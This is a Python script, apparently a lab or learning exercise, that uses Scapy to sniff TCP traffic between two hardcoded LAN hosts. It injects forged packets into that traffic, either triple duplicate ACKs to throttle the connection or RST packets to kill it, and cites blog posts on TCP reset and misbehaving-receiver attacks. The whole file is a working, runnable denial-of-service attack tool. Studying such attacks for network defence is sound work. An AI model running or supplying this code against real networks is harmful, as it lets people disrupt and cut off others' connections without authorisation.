
from scapy.all import *
from random import randint

def send_3_duplicate_ack(p):

    src_ip = p[IP].src
    src_port = p[TCP].sport
    dst_ip = p[IP].dst
    dst_port = p[TCP].dport
    seq_val = p[TCP].seq
    ack_val = p[TCP].ack
    flags = p[TCP].flags

    ack_packet = IP(src = dst_ip, 
                    dst = src_ip) / TCP(sport = dst_port,    
                                    dport = src_port, flags = "A", ack = seq_val, seq = ack_val) #/ "Q"#/ "hejsa" # if it was a normal ack packet then ack=seq_val+1 (aka seq value of next expected package). Howerever! we dont +1 to simulate packet loss
    
    send(ack_packet, verbose = 0)
    send(ack_packet, verbose = 0)
    send(ack_packet, verbose = 0)

    return


def send_reset(p):

    src_ip = p[IP].src
    src_port = p[TCP].sport
    dst_ip = p[IP].dst
    dst_port = p[TCP].dport
    seq = p[TCP].seq
    ack = p[TCP].ack
    flags = p[TCP].flags

    rst_packet = IP(src = dst_ip, 
                    dst = src_ip) / TCP(sport = dst_port,    
                                    dport = src_port, 
                                    flags = "R", 
                                    seq = ack)

    send(rst_packet, verbose = 0)
    print("sending reset packet!") #(print after sending for speed)

    return

def tcp_throttling(source_addr: str, dest_addr: str, approach = "ACK"):

    #ERROR CHECK ADDRESSER
    print(f"dst host {dest_addr} and src host {source_addr}")

    if approach == "ACK":
        sniff(filter = f"tcp and dst host {dest_addr} and src host {source_addr}", prn = send_3_duplicate_ack) # KØR UENDELIGT

        ## https://reproducingnetworkresearch.wordpress.com/2017/06/05/cs244-17-reproducing-tcp-level-attacks-tcp-congestion-control-with-a-misbehaving-receiver/

    elif approach == "RST":

        sniff(filter = f"tcp and dst host {dest_addr} and src host {source_addr}", prn = send_reset) 

        ## https://robertheaton.com/2020/04/27/how-does-a-tcp-reset-attack-work/

    else:
        raise ValueError("Incorrect or invalid approach")


def main():
    
    #tcp_throttling("192.168.1.203", "192.168.1.73", "RST")
    tcp_throttling("192.168.1.203", "192.168.1.73", "ACK")
    

if __name__ == "__main__":
    main()

## https://github.com/robert/how-does-a-tcp-reset-attack-work/blob/master/main.py
## https://gist.github.com/spinpx/263a2ed86f974a55d35cf6c3a2541dc2
        